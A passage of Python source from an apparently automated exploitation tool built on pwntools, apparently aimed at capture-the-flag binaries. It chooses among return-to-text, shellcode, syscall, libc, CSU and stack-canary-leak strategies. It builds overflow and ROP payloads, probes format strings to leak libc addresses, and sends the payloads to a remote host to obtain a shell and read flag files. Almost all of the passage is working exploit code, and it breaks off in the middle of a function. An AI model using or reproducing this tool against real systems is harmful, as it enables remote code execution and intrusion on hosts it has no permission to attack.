        self.analyzer.report_lines = self.analyzer.report()
        self.builder = ExploitBuilder(self.analyzer)
        return self.analyzer

    def print_report(self):
        """Print the analysis report."""
        for line in self.analyzer.report_lines:
            print(line)

    def recommend_strategy(self):
        """Automatically recommend an exploitation strategy."""
        a = self.analyzer
        recs = []

        # Check for cat-flag gadgets -> highest priority ret2text
        if a.cat_flag_gadgets:
            for g in a.cat_flag_gadgets:
                recs.append(('ret2text', 95,
                    f"Found inline system(\"{g['string']}\") at {hex(g['addr'])}"))

        # canary_leak: canary + format string vuln + win function
        # When canary is present, ret2text alone will fail, so prioritize canary_leak
        if a.has_canary and a.fmt_string_vulns:
            has_win = bool(a.win_funcs) or bool(a.cat_flag_gadgets)
            canary_off = a.canary_stack_offset
            if has_win and canary_off:
                recs.append(('canary_leak', 95,
                    f"Canary + format string vuln + win func "
                    f"(canary at %{canary_off}$p)"))

        # Check for win function -> ret2text
        if a.win_funcs:
            for name, addr in a.win_funcs:
                if 'system' not in name.lower() and 'got.' not in name.lower() and 'plt.' not in name.lower():
                    # Lower priority if canary is enabled (need canary_leak instead)
                    prio = 80 if a.has_canary and a.fmt_string_vulns else 90
                    extra = ""
                    if a.auto_args and a.auto_args_func == name:
                        args_hex = ', '.join(hex(x) for x in a.auto_args)
                        extra = f" (auto-args: {args_hex})"
                    recs.append(('ret2text', prio,
                        f"Found win function: {name} at {hex(addr)}{extra}"))

        # Also: system@plt + pop rdi + cat_flag string = ret2text with args
        has_system_plt = 'system' in a.plt
        has_pop_rdi = any(g[0] == 'pop rdi; ret' for g in a.gadgets)
        if has_system_plt and has_pop_rdi:
            # Check if there's a /bin/sh or cat flag string
            has_binsh = False
            try:
                if a.elf:
                    next(a.elf.search(b'/bin/sh'))
                    has_binsh = True
            except (StopIteration, Exception):
                pass
            if has_binsh:
                recs.append(('ret2text', 85,
                    "system@plt + pop rdi + /bin/sh -> system(\"/bin/sh\")"))

        # Check NX status
        nx_enabled = a.protections.get('NX', False)

        # If NX disabled -> ret2shellcode
        if not nx_enabled:
            sc_addr = a.auto_shellcode_addr
            sc_info = f"auto-addr={hex(sc_addr)}" if sc_addr else "need --sc-addr"
            recs.append(('ret2shellcode', 80,
                f"NX disabled, shellcode executable ({sc_info})"))

        # Check for ROP gadgets -> ret2syscall
        if a.gadgets:
            gadget_names = [g[0] for g in a.gadgets]
            has_64 = self.analyzer.bits == 64
            if has_64:
                needed = ['pop rdi; ret', 'pop rsi; ret',
                          'pop rdx; ret', 'syscall', 'pop rax; ret']
            else:
                # i386: either combined pop_edx_ecx_ebx or separate pops
                needed_combined = ['int 0x80', 'pop eax; ret']
                needed_sep = ['int 0x80', 'pop eax; ret', 'pop ebx; ret',
                             'pop ecx; ret', 'pop edx; ret']
                has_combined = False
                try:
                    a.rop.search(move=0, regs=['edx','ecx','ebx'])
                    has_combined = True
                except Exception:
                    pass
                if has_combined:
                    needed = needed_combined
                else:
                    needed = needed_sep
            found = [g for g in needed if g in gadget_names]
            if len(found) >= 3:
                has_binsh = False
                try:
                    if a.elf and next(a.elf.search(b'/bin/sh'), None):
                        has_binsh = True
                except Exception:
                    pass
                # Also recommend if we can auto-inject /bin/sh into writable memory
                has_writable = bool(a.auto_shellcode_addr) or bool(a.shellcode_regions)
                if has_binsh or has_writable:
                    binsh_note = "" if has_binsh else " (will auto-inject /bin/sh)"
                    recs.append(('ret2syscall', 70,
                        f"Found {len(found)}/{len(needed)} gadgets + /bin/sh{binsh_note}"))

        # ret2libc if we have PLT leak function + pop rdi
        # Boost priority when no win function exists (ret2libc is the main strategy)
        if a.plt and a.got:
            has_leak = any(n in a.plt for n in ['puts', 'printf', 'write'])
            if has_leak and has_pop_rdi:
                has_win = bool(a.win_funcs) or bool(a.cat_flag_gadgets)
                if has_win:
                    ret2libc_prio = 55  # Lower than ret2text, fallback only
                else:
                    ret2libc_prio = 75  # Primary strategy when no win func
                recs.append(('ret2libc', ret2libc_prio,
                    f"Has leak function + pop rdi gadget"
                    + (" (no win func, primary)" if not has_win else "")))

        # i386 ret2libc: doesn't need pop rdi (uses stack args via PLT)
        if a.plt and a.got and not has_pop_rdi and self.analyzer.bits == 32:
            has_leak = any(n in a.plt for n in ['puts', 'printf', 'write'])
            if has_leak:
                has_win = bool(a.win_funcs) or bool(a.cat_flag_gadgets)
                if not has_win:
                    recs.append(('ret2libc', 70,
                        "i386 has leak function via PLT (stack-based args)"))

        # x64 ret2libc without pop rdi: possible via format string leak, csu, or --libc
        if (a.plt and a.got and not has_pop_rdi and self.analyzer.bits == 64):
            has_leak = any(n in a.plt for n in ['puts', 'printf', 'write'])
            has_fmt_vuln = bool(a.fmt_string_vulns)
            has_csu = bool(a.csu_gadgets)
            if has_leak and not (a.win_funcs or a.cat_flag_gadgets):
                if has_fmt_vuln:
                    recs.append(('ret2libc', 70,
                        "x64 no pop rdi, but has format string vuln -> "
                        "leak libc via %N$p, then use libc pop rdi"))
                elif has_csu:
                    csu_info = a.csu_gadgets
                    recs.append(('ret2csu', 70,
                        f"x64 no pop rdi, but has CSU gadgets "
                        f"(pop6@{hex(csu_info['pop6_addr'])}, "
                        f"mov+call@{hex(csu_info['mov_call_addr'])}) "
                        f"-> leak libc via CSU, then use libc pop rdi"))
                else:
                    recs.append(('ret2libc', 65,
                        "x64 has leak function, but no pop rdi in binary. "
                        "Will need --libc for gadgets after leak"))

        if not recs:
            recs.append(('manual', 0,
                "No automated strategy recommended, manual analysis needed"))

        # Sort by priority
        recs.sort(key=lambda x: x[1], reverse=True)
        return recs

    def build_payload(self, strategy='auto', offset=None, win_func=None,
                      shellcode_addr=None, args=None, canary_offset=None,
                      no_align=False):
        """Build exploit payload for the given strategy."""
        # First resolve auto strategy to know which offset semantics we need
        if strategy == 'auto':
            recs = self.recommend_strategy()
            if recs:
                strategy = recs[0][0]
                print(C.info(f"Auto-selected strategy: {strategy} "
                    f"({recs[0][2]})"))
            else:
                strategy = 'ret2text'

        self.strategy = strategy

        # Resolve offset based on strategy semantics:
        # - ret2text/ret2shellcode/ret2syscall/ret2libc: offset = buf -> ret addr
        # - canary_leak: offset = buf -> canary (smaller, excludes canary+rbp)
        if offset is None:
            if strategy == 'canary_leak':
                # For canary_leak, use the buf-to-canary distance
                if self.analyzer.auto_canary_buf_offset:
                    offset = self.analyzer.auto_canary_buf_offset
                    print(C.hit(f"Auto-detected canary offset: {offset} bytes "
                                f"(buf-to-canary)"))
                elif self.analyzer.auto_offset and self.analyzer.bits == 64:
                    # Fallback: auto_offset = buf->ret = canary_offset + 8(canary) + 8(rbp)
                    offset = self.analyzer.auto_offset - 16
                    print(C.warn(f"Estimated canary offset: {offset} bytes "
                                 f"(auto_offset - 16)"))
                else:
                    print(C.warn("No canary offset detected, using default 24"))
                    offset = 24
            else:
                if self.analyzer.auto_offset:
                    offset = self.analyzer.auto_offset
                    print(C.hit(f"Auto-detected offset: {offset} bytes"))
                else:
                    print(C.warn("No offset specified, using default 112"))
                    offset = 112
        elif strategy == 'canary_leak':
            # User explicitly provided offset for canary_leak — but if they
            # provided the full offset (buf->ret), auto-adjust
            if (self.analyzer.auto_offset and
                    offset == self.analyzer.auto_offset and
                    self.analyzer.auto_canary_buf_offset):
                offset = self.analyzer.auto_canary_buf_offset
                print(C.info(f"Adjusted offset for canary_leak: {offset} "
                             f"(buf-to-canary)"))

        self.offset = offset
        print(C.info(f"Building payload: strategy={strategy}, offset={offset}"))

        if strategy == 'ret2text':
            # If we found cat-flag gadgets and no explicit win_func, use the gadget addr
            if not win_func and self.analyzer.cat_flag_gadgets:
                gadget_addr = self.analyzer.cat_flag_gadgets[0]['addr']
                payload, desc = self.builder.ret2text(
                    offset, win_addr=gadget_addr,
                    win_name=f'cat_flag_gadget@{hex(gadget_addr)}', args=args,
                    no_align=no_align)
            else:
                # Auto-fill args if not specified but auto-extracted
                if args is None and self.analyzer.auto_args:
                    args = self.analyzer.auto_args
                    args_hex = ', '.join(hex(a) for a in args)
                    print(C.hit(f"Auto-extracted args: {args_hex}"))
                payload, desc = self.builder.ret2text(
                    offset, win_name=win_func, args=args, no_align=no_align)
        elif strategy == 'ret2shellcode':
            # Auto-fill shellcode_addr if not specified
            if shellcode_addr is None:
                shellcode_addr = self.analyzer.auto_shellcode_addr
                if shellcode_addr:
                    print(C.hit(f"Auto-detected shellcode addr: {hex(shellcode_addr)}"))
            payload, desc = self.builder.ret2shellcode(
                offset, shellcode_addr=shellcode_addr)
        elif strategy == 'ret2syscall':
            payload, desc = self.builder.ret2syscall(offset)
        elif strategy == 'ret2csu':
            payload, desc = self.builder.ret2csu(
                offset, self.remote_host, self.remote_port)
        elif strategy == 'ret2libc':
            payload, desc = self.builder.ret2libc(
                offset, self.remote_host, self.remote_port)
        elif strategy == 'canary_leak':
            # Stage 1 is built here; stage 2 is built at runtime after leak.
            # Auto-fill canary_offset if not specified
            if canary_offset is None:
                canary_offset = self.analyzer.canary_stack_offset
                if canary_offset:
                    print(C.hit(f"Auto-detected canary at %{canary_offset}$p"))
            if canary_offset is None:
                return None, ("canary_leak: no --canary-offset specified and "
                               "auto-detection failed. Please specify --canary-offset N")

            self.canary_offset = canary_offset
            self.canary_win_func = win_func
            self.canary_no_align = no_align
            # Build stage 1 (format string)
            payload, desc = self.builder.canary_leak_stage1(canary_offset)
        else:
            return None, f"Unknown strategy: {strategy}"

        if payload is None:
            print(C.err(f"Payload generation failed: {desc}"))
            return None, desc

        self.payload = payload
        self.payload_desc = desc
        print(C.hit(f"Payload built: {len(payload)} bytes"))
        print(C.info(f"  {desc}"))
        return payload, desc

    def run_remote(self, host, port, interactive=True, ssl=False, cmd=None):
        """Run exploit against remote target."""
        if not HAS_PWNTOOLS:
            print(C.err("pwntools required for remote exploitation"))
            return

        self.remote_host = host
        self.remote_port = port
        self.use_ssl = ssl

        if self.strategy == 'ret2libc' or self.strategy == 'ret2csu':
            # Two-stage exploit
            return self._run_ret2libc_remote(host, port, interactive, cmd=cmd)
        elif self.strategy == 'canary_leak':
            # Two-stage: leak canary then overflow
            return self._run_canary_leak_remote(host, port, interactive)
        else:
            return self._run_single_stage_remote(host, port, interactive)

    def _run_single_stage_remote(self, host, port, interactive):
        """Run single-stage exploit (ret2text/ret2shellcode/ret2syscall)."""
        if not self.payload:
            print(C.err("No payload built. Call build_payload() first."))
            return

        print(C.info(f"Connecting to {host}:{port}" + (" (SSL)" if getattr(self, 'use_ssl', False) else "") + " ..."))
        try:
            io = remote(host, port, ssl=getattr(self, 'use_ssl', False), timeout=15)
        except Exception as e:
            print(C.err(f"Connection failed: {e}"))
            return

        # Step 1: Receive banner / prompt from the target
        try:
            banner = io.recv(timeout=3)
            if banner:
                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
        except Exception:
            pass  # No banner or connection immediately ready for input

        # Step 2: Send payload (sendline adds \n which gets() needs to return)
        print(C.info(f"Sending payload ({len(self.payload)} bytes) ..."))
        try:
            io.sendline(self.payload)
        except Exception as e:
            print(C.err(f"Send failed: {e}"))
            io.close()
            return

        # Step 3: Determine if this is a "cat flag" style exploit or a shell exploit
        is_cat_flag = (
            hasattr(self.analyzer, 'cat_flag_gadgets') and
            self.analyzer.cat_flag_gadgets and
            self.strategy in ('ret2text', 'auto')
        )

        if is_cat_flag:
            # cat-flag gadget: flag is printed to stdout, no shell
            print(C.info("cat-flag gadget detected, waiting for output ..."))
            data = self._recv_all_safe(io)
            if data:
                decoded = data.decode('utf-8', errors='replace')
                print(C.hit(f"Output:\n{decoded}"))
                flags = self._extract_flags(data)
                if flags:
                    for f in flags:
                        print(C.flag(f))
                else:
                    print(C.warn("No flag pattern found in output"))
            else:
                print(C.warn("No output received after payload"))
            io.close()
            return

        # Shell-based exploit (ret2shellcode / ret2syscall / ret2text with real shell)
        if interactive:
            # Wait briefly for shell to spawn
            time.sleep(0.3)
            try:
                initial = io.recv(timeout=1)
                if initial:
                    print(C.sub(f"Initial output: {initial.decode('utf-8', errors='replace').strip()}"))
            except Exception:
                pass

            # Send a test command to verify shell is alive
            try:
                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
                time.sleep(0.5)
                check = io.recv(timeout=2)
                if b'PWN_ARCANUM_SHELL_OK' in check:
                    print(C.hit("Shell confirmed alive!"))
                    # Try to cat flag first
                    io.sendline(b'cat /flag 2>/dev/null; cat flag.txt 2>/dev/null; cat /home/*/flag* 2>/dev/null')
                    time.sleep(0.5)
                    try:
                        flag_data = io.recv(timeout=2)
                        if flag_data:
                            print(C.hit(f"Flag output: {flag_data.decode('utf-8', errors='replace').strip()}"))
                            flags = self._extract_flags(flag_data)
                            for f in flags:
                                print(C.flag(f))
                    except Exception:
                        pass
                else:
                    print(C.warn(f"Unexpected response: {check}"))
            except Exception:
                print(C.warn("No shell response, trying interactive anyway..."))

            print(C.hit("Switching to interactive mode (Ctrl+C to exit)"))
            try:
                io.interactive()
            except KeyboardInterrupt:
                print("\n" + C.info("Exiting interactive mode"))
        else:
            # Non-interactive: collect all output
            data = self._recv_all_safe(io)
            if data:
                print(C.hit(f"Received: {data.decode('utf-8', errors='replace')}"))
                flags = self._extract_flags(data)
                for f in flags:
                    print(C.flag(f))

        io.close()

    def _run_ret2libc_fmt_leak(self, host, port, interactive, cmd=None):
        """Run ret2libc using format string leak (when no pop rdi in binary).

        Strategy for 64-bit without pop rdi but with printf(buf) vuln:
        Stage 1a: Send %N$p format string to leak __libc_start_main return addr
        Stage 1b: Overflow to call main() again (for stage 2)
        Stage 2:  Use libc's pop rdi + system + /bin/sh (after libc base resolved)
        """
        print(C.info("No pop rdi in binary, using format string leak for libc"))
        print(C.info(f"Connecting to {host}:{port}"
              + (" (SSL)" if getattr(self, 'use_ssl', False) else "")))

        try:
            io = remote(host, port, ssl=getattr(self, 'use_ssl', False), timeout=15)
        except Exception as e:
            print(C.err(f"Connection failed: {e}"))
            return

        # Receive banner
        try:
            banner = io.recv(timeout=3)
            if banner:
                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
        except Exception:
            pass

        # ---- Stage 1a: Format string leak libc address ----
        # We need to find the right %N$p offset for a libc address on the stack.
        # On x86-64, typical stack layout during printf:
        #   rdi = format string (our input)
        #   rsi, rdx, rcx, r8, r9 = arg1-5
        #   [rsp] = arg6, [rsp+8] = arg7, ...
        # __libc_start_main's return address is typically at a high offset.
        # We probe multiple offsets to find a libc address.

        # First, try to find __libc_start_main return addr by probing
        # Common offsets: 7-40 for x64, but varies by stack layout
        # We'll probe several offsets
        leaked_addr = None
        leak_offset = None
        leak_got_name = '__libc_start_main_ret'

        # Use the known vuln info to estimate a starting offset
        # For a typical vuln with buf at [rbp-0x40]:
        #   The return address from __libc_start_main is typically at offset ~31-39
        # We probe from 1 to 50 to find a libc-looking address

        # First, try a quick probe with common offsets
        print(C.info("Probing format string offsets for libc address ..."))
        probe_offsets = list(range(1, 51))
        # Collect all candidate libc addresses
        libc_candidates = []  # (offset, address)

        for off in probe_offsets:
            try:
                fmt_payload = f'%{off}$p'.encode()
                io.sendline(fmt_payload)
                time.sleep(0.1)
                resp = io.recvrepeat(1)
                if not resp:
                    continue

                # Parse the response - it should contain a hex address
                resp_text = resp.decode('utf-8', errors='replace').strip()
                # The format string output may be preceded by "Your input:" etc.
                # Extract the last hex-looking value
                import re
                hex_matches = re.findall(r'0x[0-9a-fA-F]+', resp_text)
                if hex_matches:
                    try:
                        val = int(hex_matches[-1], 16)
                        # Accept libc address (0x7fXXXX, exclude stack 0x7ffXXXX)
                        if (0x7f0000000000 <= val < 0x7fffffffffff):
                            libc_candidates.append((off, val))
                    except ValueError:
                        continue

                # Also check for raw hex in the output (without 0x prefix)
                raw_matches = re.findall(r'[0-9a-fA-F]{12,}', resp_text)
                for match in raw_matches:
                    try:
                        val = int(match, 16)
                        if (0x7f0000000000 <= val < 0x7fffffffffff):
                            libc_candidates.append((off, val))
                    except ValueError:
                        continue

            except Exception:
                continue

        # Filter candidates: prefer non-stack addresses (below 0x7ffc00000000)
        # On x86-64, stack addresses are typically 0x7ffc-0x7fff range,
        # while libc addresses are 0x7f00-0x7fbf range.
        STACK_THRESHOLD = 0x7ffc00000000
        non_stack = [(o, v) for o, v in libc_candidates if v < STACK_THRESHOLD]
        if non_stack:
            # Pick the first non-stack candidate
            leak_offset, leaked_addr = non_stack[0]
            print(C.hit(f"Found libc address at %{leak_offset}$p: {hex(leaked_addr)}"))
        elif libc_candidates:
            # All candidates are in stack range - use the first one anyway
            # but note it might be a stack address
            leak_offset, leaked_addr = libc_candidates[0]
            print(C.warn(f"All leaked addresses in stack range, using %{leak_offset}$p: "
                        f"{hex(leaked_addr)}"))
            print(C.warn("This might be a stack address, not a libc address"))
        else:
            leaked_addr = None

        if leaked_addr is None:
            print(C.err("Failed to find libc address via format string probing"))
            io.close()
            return

        print(C.hit(f"Leaked libc address: {hex(leaked_addr)} (from %{leak_offset}$p)"))

        # ---- Stage 1b: Overflow to return to main (for stage 2) ----
        # Now send an overflow payload to restart the vulnerable function
        # The overflow returns to main/vuln so we can send stage 2
        main_addr = None
        for name in ['main', '_start', 'vuln', 'vulnerable']:
            if name in self.analyzer.elf.symbols:
                main_addr = self.analyzer.elf.symbols[name]
                break

        if main_addr is None:
            print(C.err("Cannot find main/vuln to return to for stage 2"))
            io.close()
            return

        # Build overflow payload: overflow + ret_to_main
        overflow_payload = b'A' * self.offset
        # Add ret gadget for alignment if available
        ret_gadget = None
        for name, addr in self.analyzer.gadgets:
            if name == 'ret':
                ret_gadget = addr
                break
        if ret_gadget:
            overflow_payload += struct.pack('<Q', ret_gadget)
        overflow_payload += struct.pack('<Q', main_addr)

        print(C.info(f"Sending overflow to restart ({len(overflow_payload)} bytes)"))
        io.sendline(overflow_payload)
        time.sleep(0.5)
        try:
            io.recvrepeat(1)  # consume output
        except Exception:
            pass

        # ---- Identify libc and resolve offsets ----
        # The leaked address is some libc address (could be read, puts,
        # __libc_start_main_ret, etc depending on which stack slot we hit)
        # We need to figure out which libc function it corresponds to.
        if not self.libc_offsets:
            print(C.sub("Auto-identifying libc version ..."))
            # Use __libc_start_main_ret offset for lookup
            libc_info = self._lookup_libc_online('__libc_start_main_ret', leaked_addr)
            if libc_info and libc_info.get('system', 0) != 0:
                self.libc_offsets = libc_info
                print(C.hit("Libc identified online, offsets resolved"))
            else:
                libc_path = getattr(self, 'libc_path', None)
                if libc_path:
                    self.libc_offsets = self._get_libc_offsets_from_elf(libc_path)
                if not self.libc_offsets:
                    print(C.warn("Online lookup failed and no --libc specified"))
                    print(C.warn("Trying hardcoded Debian 12 glibc 2.36 offsets"))
                    self.libc_offsets = {
                        'puts': 0x77980,
                        'system': 0x4c490,
                        'binsh': 0x197031,
                        'read': 0xf82a0,
                        'pop_rdi': 0x277e5,
                    }

        # Calculate libc base by finding which known offset matches
        # The leaked address could be any libc function + some offset.
        # We try all known offsets to find which gives a page-aligned base.
        libc_base = None
        low12 = leaked_addr & 0xfff

        # Try common function offsets that match the low 12 bits
        # Include common "+N" offsets for mid-function addresses
        candidate_funcs = ['read', 'puts', 'printf', 'write', '__libc_start_main',
                          '__libc_start_main_ret', 'system']
        libc_path = getattr(self, 'libc_path', None)

        # Build offset list: for each function, try exact offset and +N offsets
        # (because we might leak mid-function addresses)
        test_offsets = {}
        for func_name in candidate_funcs:
            func_off = self.libc_offsets.get(func_name, 0)
            if func_off == 0:
                continue
            # Try exact match
            if (func_off & 0xfff) == low12:
                test_offsets[func_name] = func_off
            # Try +1 to +0x20 (mid-function)
            for delta in range(0x20):
                if ((func_off + delta) & 0xfff) == low12:
                    key = f"{func_name}+0x{delta:x}" if delta else func_name
                    test_offsets[key] = func_off + delta
                    break

        # Also brute-force: check ALL offsets in libc at page+offset matching low12
        # But prioritize known function offsets first
        if libc_path and not test_offsets:
            try:
                from pwn import ELF as PwnELF
                libc_elf = PwnELF(libc_path, checksec=False)
                # Build a comprehensive list of known function offsets to check
                known_funcs = ['read', 'puts', 'printf', 'write', '__libc_start_main',
                              '__libc_start_main_ret', 'system', '__libc_read',
                              'setvbuf', 'malloc', 'free']
                for fname in known_funcs:
                    foff = libc_elf.symbols.get(fname, 0)
                    if foff == 0:
                        continue
                    # Try exact match and mid-function (+0 to +0x100)
                    for delta in range(0x100):
                        if ((foff + delta) & 0xfff) == low12:
                            base = leaked_addr - (foff + delta)
                            if base & 0xfff == 0 and base > 0:
                                key = f"{fname}+0x{delta:x}" if delta else fname
                                test_offsets[key] = foff + delta
                                break
            except Exception:
                pass

        # Still no match? Try brute-force scan
        if libc_path and not test_offsets:
            try:
                from pwn import ELF as PwnELF
                libc_elf = PwnELF(libc_path, checksec=False)
                for page in range(0, min(len(libc_elf.data), 0x200000), 0x1000):
                    offset = page + low12
                    base = leaked_addr - offset
                    if base & 0xfff == 0 and base > 0:
                        test_offsets[f"libc+0x{offset:x}"] = offset
                        break
            except Exception:
                pass

        # Find which offset gives a page-aligned base
        for name, offset in test_offsets.items():
            base = leaked_addr - offset
            if base & 0xfff == 0:
                libc_base = base
                print(C.hit(f"Libc base: {hex(libc_base)} (from {name} offset "
                           f"{hex(offset)})"))
                break

        if libc_base is None:
            # Last resort: assume the address is page-aligned itself
            # and subtract a multiple of 0x1000
            libc_base = leaked_addr - (leaked_addr & 0xfff)
            print(C.warn(f"Cannot determine exact libc function, guessing base: "
                        f"{hex(libc_base)}"))
            print(C.warn("Specify --libc for accurate base calculation"))

        self.leaked_libc_base = libc_base

        # ---- Find pop rdi in libc ----
        pop_rdi_from_libc = None
        print(C.info("Searching for pop rdi gadget in libc ..."))
        pop_rdi_offset = self.libc_offsets.get('pop_rdi', 0)
        if pop_rdi_offset == 0:
            pop_rdi_offset = self._find_pop_rdi_in_libc_offsets()
        if pop_rdi_offset == 0:
            # Try searching the libc ELF if provided
            libc_path = getattr(self, 'libc_path', None)
            if libc_path:
                pop_rdi_offset = self._search_pop_rdi_in_libc_elf(libc_path)
        if pop_rdi_offset != 0:
            pop_rdi_from_libc = libc_base + pop_rdi_offset
            print(C.hit(f"Found pop rdi in libc at {hex(pop_rdi_from_libc)}"))
        else:
            print(C.err("Cannot find pop rdi gadget in libc"))
            io.close()
            return

        system_off = self.libc_offsets.get('system', 0)
        binsh_off = self.libc_offsets.get('binsh', 0)

        if system_off == 0 or binsh_off == 0:
            print(C.err("Missing system or /bin/sh offset in libc database"))
            io.close()
            return

        # ---- Stage 2: pop rdi -> "/bin/sh" -> system() ----
        stage2, desc2 = self.builder.ret2libc_stage2(
            self.offset, libc_base,
            system_off,
            binsh_off,
            ret_gadget,
            pop_rdi_addr=pop_rdi_from_libc)

        print(C.info(f"Sending stage 2 ({len(stage2)} bytes): {desc2}"))

        # Wait for program to restart and prompt for input
        fmt_prompt = None
        if hasattr(self.analyzer, 'input_prompt') and self.analyzer.input_prompt:
            fmt_prompt = self.analyzer.input_prompt[-min(len(self.analyzer.input_prompt), 20):].encode()
        try:
            io.recvuntil(fmt_prompt if fmt_prompt else b"Your input:", timeout=5)
            print(C.sub("Program restarted, ready for stage 2"))
        except Exception:
            time.sleep(1)
            try:
                io.recv(timeout=1)
            except Exception:
                pass

        io.sendline(stage2)

        if interactive:
            time.sleep(0.3)
            try:
                initial = io.recv(timeout=1)
                if initial:
                    print(C.sub(f"Initial output: "
                               f"{initial.decode('utf-8', errors='replace').strip()}"))
            except Exception:
                pass

            try:
                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
                time.sleep(0.5)
                check = io.recv(timeout=2)
                if b'PWN_ARCANUM_SHELL_OK' in check:
                    print(C.hit("Shell is alive!"))
                    # Try to read flag
                    if self._try_get_flag(io):
                        io.close()
                        return
            except Exception:
                pass

            print(C.hit("Switching to interactive mode (Ctrl+C to exit)"))
            try:
                io.interactive()
            except KeyboardInterrupt:
                print("\n" + C.info("Exiting interactive mode"))
        else:
            data = self._recv_all_safe(io)
            if data:
                print(C.hit(f"Received: {data.decode('utf-8', errors='replace')}"))
                flags = self._extract_flags(data)
                for f in flags:
                    print(C.flag(f))

        io.close()

    def _search_pop_rdi_in_libc_elf(self, libc_path):
        """Search for pop rdi; ret (0x5f 0xc3) in a libc ELF file.

        Returns the offset if found, 0 otherwise.
        """
        try:
            from pwn import ELF as PwnELF
            libc = PwnELF(libc_path)
            # Search for pop rdi; ret
            for g in libc.search(b'\x5f\xc3'):
                return g
        except Exception as e:
            print(C.warn(f"Failed to search libc ELF: {e}"))
        return 0

    def _run_ret2libc_remote(self, host, port, interactive, cmd=None):
        """Run two-stage ret2libc exploit with auto libc identification."""
        # Check if we need format string leak (no pop rdi but has fmt vuln)
        use_fmt_leak = (self.analyzer.bits == 64 and
                        not any(g[0] == 'pop rdi; ret' for g in self.analyzer.gadgets) and
                        bool(self.analyzer.fmt_string_vulns))

        if use_fmt_leak:
            return self._run_ret2libc_fmt_leak(host, port, interactive, cmd=cmd)

        print(C.info(f"Stage 1: Leaking libc address from {host}:{port}"
              + (" (SSL)" if getattr(self, 'use_ssl', False) else "")))

        # Build stage 1 payload
        if self.strategy == 'ret2csu':
            stage1, desc = self.builder.ret2csu(
                self.offset, self.remote_host, self.remote_port)
        else:
            stage1, desc = self.builder.ret2libc(
                self.offset, self.remote_host, self.remote_port)
        if stage1 is None:
            print(C.err(f"Stage 1 failed: {desc}"))
            return

        try:
            io = remote(host, port, ssl=getattr(self, 'use_ssl', False), timeout=15)
        except Exception as e:
            print(C.err(f"Connection failed: {e}"))
            return

        # Receive banner if any
        try:
            banner = io.recv(timeout=3)
            if banner:
                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
        except Exception:
            pass

        print(C.info(f"Sending stage 1 ({len(stage1)} bytes)"))
        io.sendline(stage1)

        # Receive all output after stage 1 (includes leaked address + program restart)
        # The leaked address comes from puts@PLT printing the GOT entry,
        # which happens after the function returns through our ROP chain.
        #
        # IMPORTANT: The leaked libc address may contain 0x0a (newline) bytes.
        # For example, a typical address like 0x7f3d2a1b9800 in LE has
        # bytes: 00 98 1b 2a 3d 7f 00 00, but if byte[6] is 0x0a
        # (e.g. 0x000a7f3d2a1b98), then puts() outputs a literal newline
        # in the middle of the address. This is fine for read()/recvrepeat(),
        # but recvline() would truncate at the 0x0a.
        #
        # Strategy: try to wait for the program to restart and show its prompt
        # again (e.g. "Input:"), which gives us a reliable endpoint.
        # If no prompt detected, fall back to recvrepeat with timeout.

        # Detect what prompt the binary uses
        input_prompt = self.analyzer.input_prompt  # auto-detected from strings
        prompt_bytes = None
        if input_prompt:
            # Use the last few chars as the prompt to match
            prompt_bytes = input_prompt[-min(len(input_prompt), 20):].encode()
            print(C.sub(f"Detected input prompt: {repr(input_prompt)}"))

        leaked = b''
        try:
            time.sleep(0.3)
            if prompt_bytes:
                # Wait for program to restart and show prompt
                try:
                    leaked = io.recvuntil(prompt_bytes, timeout=8)
                    # Remove the prompt suffix from leaked data
                    leaked = leaked[:-len(prompt_bytes)]
                    print(C.info(f"Received {len(leaked)} bytes (up to prompt)"))
                except Exception:
                    # Prompt not found, fall back to recvrepeat
                    leaked = io.recvrepeat(3)
                    print(C.info(f"Received {len(leaked)} bytes (recvrepeat fallback)"))
            else:
                # No known prompt, use recvrepeat
                leaked = io.recvrepeat(3)
                print(C.info(f"Received {len(leaked)} bytes total"))

            if leaked:
                if self.verbose or True:
                    printable = leaked.decode('utf-8', errors='replace')
                    print(C.sub(f"Raw output: {repr(printable[:200])}"))
            else:
                print(C.err("No data received after stage 1"))
                io.close()
                return
        except Exception as e:
            print(C.err(f"Receive failed: {e}"))
            io.close()
            return

        # Parse leaked address
        leaked_addr = self._parse_leaked_addr(leaked)
        if leaked_addr is None:
            print(C.err("Failed to parse leaked address"))
            print(C.info(f"Raw data: {leaked.hex()}"))
            io.close()
            return

        print(C.hit(f"Leaked address: {hex(leaked_addr)}"))

        # Determine which GOT function we leaked
        # Instead of assuming the first GOT function name matches,
        # we match the leaked address to a GOT function by low12-bit
        # comparison using known libc offsets.
        leak_gots = [(n, self.analyzer.got[n])
                     for n in ['puts', 'printf', 'write', '__libc_start_main',
                               'read', 'setbuf', 'malloc', 'free']
                     if n in self.analyzer.got]

        # ---- Parse ALL leaked addresses from double-leak output ----
        # In double-leak mode, the output contains two libc addresses
        # separated by newlines. We scan for all 0x7f-prefixed addresses.
        all_leaked_addrs = []
        try:
            raw = leaked
            for pos in range(len(raw) - 5):
                chunk = raw[pos:pos+6]
                if len(chunk) == 6 and chunk[5] == 0x7f:
                    addr = struct.unpack('<Q', chunk + b'\x00\x00')[0]
                    if 0x7f0000000000 <= addr <= 0x7fffffffffff:
                        all_leaked_addrs.append((pos, addr))
                elif len(chunk) == 6 and (chunk[5] & 0x7f) == chunk[5]:
                    addr = struct.unpack('<Q', chunk + b'\x00\x00')[0]
                    if 0x7f0000000000 <= addr <= 0x7fffffffffff:
                        all_leaked_addrs.append((pos, addr))
            # Deduplicate (same address found at overlapping positions)
            seen = set()
            unique_addrs = []
            for pos, addr in all_leaked_addrs:
                if addr not in seen:
                    seen.add(addr)
                    unique_addrs.append(addr)
            all_leaked_addrs = unique_addrs
        except Exception:
            all_leaked_addrs = [leaked_addr] if leaked_addr else []

        if not all_leaked_addrs and leaked_addr:
            all_leaked_addrs = [leaked_addr]

        # Match leaked addresses to GOT function names via low12-bit
        # If we have libc_offsets loaded, use them; otherwise use a
        # heuristic: try each GOT function name against each leaked addr.
        def _match_leak_to_got(addr_list, got_names, offsets):
            """Match each leaked address to a GOT function name by low12-bit.
            Returns list of (func_name, addr) pairs."""
            matched = []
            remaining = list(addr_list)
            for gname in got_names:
                func_off = offsets.get(gname, 0) if offsets else 0
                if func_off == 0:
                    continue
                low12 = func_off & 0xfff
                for addr in remaining:
